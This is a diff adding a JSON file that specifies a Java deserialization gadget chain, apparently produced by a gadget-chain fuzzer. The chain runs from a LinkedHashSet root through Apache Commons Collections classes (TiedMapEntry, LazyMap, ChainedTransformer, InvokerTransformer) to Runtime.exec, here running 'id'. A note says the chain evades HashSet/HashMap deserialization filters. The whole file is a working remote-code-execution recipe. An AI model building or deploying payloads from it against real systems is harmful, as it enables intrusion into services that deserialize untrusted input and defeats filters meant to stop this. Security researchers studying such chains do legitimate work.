@@ -1,0 +1,67 @@
+{
+  "chain_type": "CC_LinkedHashSet_Exec - LinkedHashSet root trigger (completed from partial finding #1)",
+  "root_class": "java.util.LinkedHashSet",
+  "root_trigger": "readObject->HashMap.put->hash->TiedMapEntry.hashCode->LazyMap.get",
+  "links": [
+    {
+      "class": "org.apache.commons.collections.keyvalue.TiedMapEntry",
+      "field_overrides": {
+        "map": {"$ref": "link:1"},
+        "key": "foo"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.map.LazyMap",
+      "field_overrides": {
+        "map": {},
+        "factory": {"$ref": "link:2"}
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ChainedTransformer",
+      "field_overrides": {
+        "iTransformers": [
+          {"$ref": "link:3"},
+          {"$ref": "link:4"},
+          {"$ref": "link:5"},
+          {"$ref": "link:6"},
+          {"$ref": "link:7"}
+        ]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ConstantTransformer",
+      "field_overrides": { "iConstant": "java.lang.Runtime" }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "getMethod",
+        "iParamTypes": ["java.lang.String", "[Ljava.lang.Class;"],
+        "iArgs": ["getRuntime", []]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "invoke",
+        "iParamTypes": ["java.lang.Object", "[Ljava.lang.Object;"],
+        "iArgs": [null, []]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "exec",
+        "iParamTypes": ["java.lang.String"],
+        "iArgs": ["id"]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ConstantTransformer",
+      "field_overrides": { "iConstant": 1 }
+    }
+  ],
+  "sink_method": "Runtime.exec",
+  "notes": "LinkedHashSet bypasses HashSet/HashMap pattern-matching filters. Completed from fuzzer partial finding #1."
+}
